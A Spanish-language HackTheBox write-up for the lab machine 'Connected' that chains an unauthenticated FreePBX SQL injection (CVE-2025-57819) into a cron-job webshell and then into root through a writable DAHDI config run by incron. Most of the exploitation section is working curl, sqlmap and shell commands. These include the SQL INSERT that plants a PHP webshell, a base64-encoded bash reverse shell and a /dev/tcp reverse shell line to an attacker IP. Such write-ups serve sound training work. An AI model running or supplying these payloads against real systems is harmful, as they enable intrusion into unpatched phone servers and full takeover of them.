---
title: "Connected — HackTheBox Writeup"
machine: "Connected"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["CVE", "SQLi", "RCE", "Upload", "Privesc"]
retired: true
summary: "CVEs: CVE-2025-57819 · CVE-2025-61678 · CVE-2025-66039"
draft: false
---
> **Dificultad:** Easy | **OS:** Linux | **Autor:** 4Pr3nd1z
**CVEs:** CVE-2025-57819 · CVE-2025-61678 · CVE-2025-66039
> 

---

## 📋 Índice

---

## 📖 Descripción General

**Connected** es una máquina Linux de dificultad Easy en HackTheBox basada en una vulnerabilidad real del mundo real: CVE-2025-57819, una SQL injection no autenticada en FreePBX 16 que fue explotada activamente en 2025 y añadida al catálogo CISA KEV. La cadena de ataque combina SQLi unauthenticated para obtener RCE via cron jobs maliciosos, seguido de una escalada de privilegios abusando del servicio incron y un archivo de configuración DAHDI escribible por el usuario `asterisk`.

**Stack tecnológico:** FreePBX 16.0.40.7 · Apache 2.4.6 · PHP 7.4.16 · MariaDB · CentOS 7

---

## 🔍 Reconocimiento

### Configuración inicial

```bash
echo "10.129.10.127 connected.htb" | sudo tee -a /etc/hosts
```

### Escaneo Nmap

```bash
sudo nmap 10.129.10.127 -p 22,80,443 -sCV -Pn -oN targeted
```

**Resultados:**

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.4 |
| 80/tcp | HTTP | Apache 2.4.6 (CentOS) PHP/7.4.16 |
| 443/tcp | HTTPS | Apache 2.4.6 + SSL |

**Hallazgos clave del escaneo:**

- Puerto 80 redirige automáticamente a `/admin`
- El certificado SSL (CN=`pbxconnect`) revela que es un sistema PBX
- `robots.txt` tiene `/` como disallowed — intentan ocultar todo

### WhatWeb

```bash
whatweb http://connected.htb/
```

Confirma: **FreePBX** corriendo en Apache/CentOS con PHP 7.4.16.

---

## 🌐 Análisis de la Aplicación Web

### Panel de administración FreePBX

Visitando `http://connected.htb/admin/` encontramos el login de **FreePBX 16.0.40.7**.

### 🔑 Key oculta en el HTML

Revisando el código fuente del login, encontramos un elemento con texto blanco sobre fondo blanco (invisible para el usuario):

```html
<div id="key" style="color: white;font-size:small">
    viq8860o5a4bcr8ghk9pqh347q
</div>
```

Esta key aparece también en el UCP junto con la IP del visitante:

```html
<div class="extra-info pull-left">viq8860o5a4bcr8ghk9pqh347q</div>
<div class="extra-info pull-right">10.10.15.55</div>
```

> 💡 El servidor reflejaba la IP del atacante en el HTML del UCP — comportamiento anómalo que indica procesamiento server-side activo.
> 

### CVEs identificados

| CVE | Tipo | CVSS | Estado en 16.0.40.7 |
| --- | --- | --- | --- |
| CVE-2025-57819 | SQLi Unauthenticated | Crítico | ✅ Vulnerable |
| CVE-2025-61675 | SQLi Authenticated (Endpoint Manager) | Alto | ✅ Vulnerable |
| CVE-2025-61678 | File Upload RCE Authenticated | 8.6 | ✅ Vulnerable |
| CVE-2025-66039 | Auth Bypass (AUTHTYPE=webserver) | 9.3 | ⚠️ No-default config |

---

## 🔑 Descubrimiento de Credenciales

### Token CSRF en UCP

El UCP requiere un token para el login:

```bash
TOKEN=$(curl -s "http://connected.htb/ucp/" | grep -oP 'name="token" value="\K[^"]+')
```

### La key como contraseña universal

Probando la key encontrada en el HTML como contraseña para distintos usuarios del UCP:

```bash
for user in 1000 1001 1002 admin operator; do
  TOKEN=$(curl -s -c /tmp/new.txt "http://connected.htb/ucp/" | \
    grep -oP 'name="token" value="\K[^"]+')
  result=$(curl -s -X POST "http://connected.htb/ucp/?display=dashboard" \
    -c /tmp/new.txt -b /tmp/new.txt \
    -d "username=$user&password=viq8860o5a4bcr8ghk9pqh347q&token=$TOKEN" | \
    grep -c "Welcome")
  echo "[$user:key] → Welcome=$result"
done
```

**Resultado:**

```
[1000:key] → Welcome=1
[1001:key] → Welcome=1
[1002:key] → Welcome=1
[admin:key] → Welcome=1
[operator:key] → Welcome=1
```

✅ La key `viq8860o5a4bcr8ghk9pqh347q` es la contraseña de todos los usuarios del UCP.

---

## 👥 Enumeración de Usuarios UCP

### Módulos instalados

```bash
gobuster dir -u "http://connected.htb/admin/modules/" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -t 40 --no-error -b 404,403 2>/dev/null
```

Módulos relevantes encontrados: `api`, `endpoint`, `sysadmin`, `voicemail`, `recordings`, `firewall`, `manager`

---

## 💉 Explotación — CVE-2025-57819 (SQLi Unauthenticated)

### Confirmación de la vulnerabilidad

El endpoint vulnerable usa el namespace completo de PHP para bypassear la autenticación:

```bash
curl -s "http://connected.htb/admin/ajax.php?\
module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model\
&brand=x';SELECT+SLEEP(5)--" -v 2>&1 | grep "time\|HTTP"
```

**Resultado:** La request tardó **13 segundos** (2 × SLEEP(5)) — SQLi time-based blind confirmada.

### Confirmación con SQLMap

```bash
sqlmap -u "http://connected.htb/admin/ajax.php?\
module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model&brand=x" \
  -p brand --dbms=mysql --technique=T \
  --time-sec=5 --batch --dbs
```

**Bases de datos encontradas:**

- `asterisk`
- `asteriskcdrdb`
- `information_schema`

**Sistema:** Linux CentOS 7, MySQL >= 5.0.12 (MariaDB fork)

---

## ❌ Intento Fallido — Extracción del Hash via SQLMap

### Dump de la tabla ampusers

Intentamos extraer la contraseña del admin via time-based blind:

```bash
sqlmap -u "http://connected.htb/admin/ajax.php?\
module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model&brand=x" \
  -p brand --dbms=mysql --technique=T \
  --time-sec=5 --batch \
  -D asterisk -T ampusers --dump
```

**Columnas extraídas** (8 columnas, ~1h 17min de espera):

| username | password_sha1 | email | extension | ... |
| --- | --- | --- | --- | --- |
| admin | `05c689686a4fad5ce3ec76e7ae5708b1fe2da43a` | (blank) | (blank) | ... |

### Intento de crackeo del hash

```bash
# SHA1 estándar
hashcat -m 100 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
# Resultado: Exhausted — no crackeado

# Double SHA1
hashcat -m 4500 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
# Resultado: Exhausted — no crackeado
```

> ⏱️ **Lección aprendida:** El time-based blind SQLi es extremadamente lento (1h+ para extraer un hash de 40 chars) y el hash resultante no estaba en wordlists comunes. Existía un vector mucho más directo que no requería crackear nada.
> 

### Stacked queries — bloqueadas

```
[WARNING] execution of non-query SQL statements is only available
when stacked queries are supported
```

El INSERT via time-based blind no era posible. Necesitábamos otro approach.

---

## 🔥 Error-Based SQLi y Webshell via Cron Job

### Descubrimiento del vector correcto

Revisando el PoC original del CVE-2025-57819, el vector real usa **error-based SQLi** con `EXTRACTVALUE`, no time-based:

```bash
curl -i -k "http://connected.htb/admin/ajax.php?\
module=FreePBX%5Cmodules%5Cendpoint%5Cajax\
&command=model&template=x&model=model\
&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

**Respuesta:**

```json
{
  "error": {
    "message": "SQLSTATE[HY000]: General error: 1105 XPATH syntax error:
    '~USER:freepbxuser@localhost~'::"
  }
}
```

✅ Error-based SQLi confirmada — los datos se reflejan directamente en el error.

### Insertar cron job malicioso

El CVE-2025-57819 explota la tabla `cron_jobs` de FreePBX para ejecutar comandos arbitrarios:

```bash
curl -g -s "http://connected.htb/admin/ajax.php?\
module=FreePBX\modules\endpoint\ajax\
&command=model&template=x&model=model\
&brand=x';INSERT%20INTO%20cron_jobs%20\
(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)\
%20VALUES%20('sysadmin','pwn',\
'echo%20PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=|base64%20-d\
%20>/var/www/html/cmd.php',NULL,'*%20*%20*%20*%20*',30,1,1)--%20-"
```

El payload base64 decodifica a: `<?php system($_GET['cmd']);?>`

### Verificación de la webshell

Después de esperar ~1 minuto para que el cron se ejecute:

```bash
curl -s "http://connected.htb/cmd.php?cmd=id"
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

✅ **RCE confirmado como usuario `asterisk`**

### Reverse shell

```bash
# Listener
penelope 4444

# Trigger via webshell
curl -s "http://connected.htb/cmd.php?cmd=printf+\
KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNTUvNDQ0NCAwPiYxKSAm|base64+-d|bash"
```

```
[+] New Reverse Shell => connected 10.129.10.127 Linux-x86_64
[+] PTY upgrade successful
[asterisk@connected html]$
```

---

## 🚩 Flag de Usuario

```bash
find / -name "user.txt" 2>/dev/null
# /home/asterisk/user.txt

cat /home/asterisk/user.txt
# 316c80d1937fd3e490d40a8635f8f334
```

---

## ⬆️ Escalada de Privilegios — incron + DAHDI

### Enumeración de incron

```bash
cat /etc/incron.d/*
```

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
...
```

**incron** ejecuta comandos como root cuando se modifican archivos específicos.

### Script DAHDI vulnerable

```bash
cat /usr/sbin/sysadmin_dahdi_restart
```

```bash
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart   # <-- Este script sourcéa /etc/dahdi/init.conf
sleep 5
export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

### Archivo de configuración DAHDI escribible

```bash
cat /etc/init.d/dahdi | grep "init.conf"
# [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf

ls -la /etc/dahdi/init.conf
# -rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
```

✅ `/etc/dahdi/init.conf` pertenece a `asterisk` y es **escribible por nosotros**.

Cuando `incron` dispara `sysadmin_dahdi_restart` (que ejecuta `/etc/init.d/dahdi restart`), este script sourcéa `init.conf` **como root**.

### Explotación

**Listener:**

```bash
nc -lvnp 4446
```

**Inyección del payload:**

```bash
echo 'bash -i >& /dev/tcp/10.10.15.55/4446 0>&1' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

El `touch` dispara el watcher de incron → ejecuta `sysadmin_dahdi_restart` como root → el script hace `restart` de DAHDI → sourcéa `init.conf` → ejecuta nuestro payload.

---

## 🏆 Flag de Root

```bash
[root@connected /]# cat /root/root.txt
d7fbd375f48bdba4acef2fe6907cea65
```

---

## 🗺️ Resumen de la Cadena de Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│              CONNECTED — Cadena de Ataque                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Reconocimiento                                                  │
│  Puerto 80/443 → FreePBX 16.0.40.7                              │
│         │                                                        │
│         ▼                                                        │
│  Key oculta en HTML → viq8860o5a4bcr8ghk9pqh347q               │
│         │                                                        │
│         ▼                                                        │
│  CVE-2025-57819 (SQLi Unauthenticated)                          │
│  /admin/ajax.php?module=FreePBX\modules\endpoint\ajax           │
│  Parámetro: brand — Error-based EXTRACTVALUE                    │
│         │                                                        │
│         ▼                                                        │
│  INSERT INTO cron_jobs → Webshell PHP en /var/www/html          │
│         │                                                        │
│         ▼                                                        │
│  RCE → asterisk (uid=999)                                       │
│         │                                                        │
│         ├──────────────────────────────────► user.txt ✅        │
│         │                                                        │
│         ▼                                                        │
│  Enumeración incron → /etc/incron.d/                            │
│  dahdi_restart → /usr/sbin/sysadmin_dahdi_restart               │
│         │                                                        │
│         ▼                                                        │
│  /etc/dahdi/init.conf (owner: asterisk, sourcéado por root)     │
│  echo 'bash reverse shell' >> /etc/dahdi/init.conf              │
│         │                                                        │
│         ▼                                                        │
│  touch /var/spool/asterisk/sysadmin/dahdi_restart               │
│  → incron trigger → root ejecuta init.conf                      │
│         │                                                        │
│         ▼                                                        │
│  Shell como root ──────────────────────► root.txt ✅            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Herramientas Utilizadas

| Herramienta | Uso |
| --- | --- |
| nmap | Escaneo de puertos y servicios |
| gobuster | Fuzzing de directorios y módulos |
| sqlmap | Confirmación de SQLi y dump de BD |
| hashcat | Intento de crackeo del hash SHA1 |
| curl | Explotación manual de SQLi y webshell |
| penelope | Handler de reverse shells con upgrade PTY |
| nc | Listener para shell de root |

---

## 📚 Referencias

- [CVE-2025-61678 — FreePBX File Upload RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-61678)
- [CISA KEV — FreePBX CVE-2025-57819](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

---

*Writeup por **4Pr3nd1z** — Junio 2026*
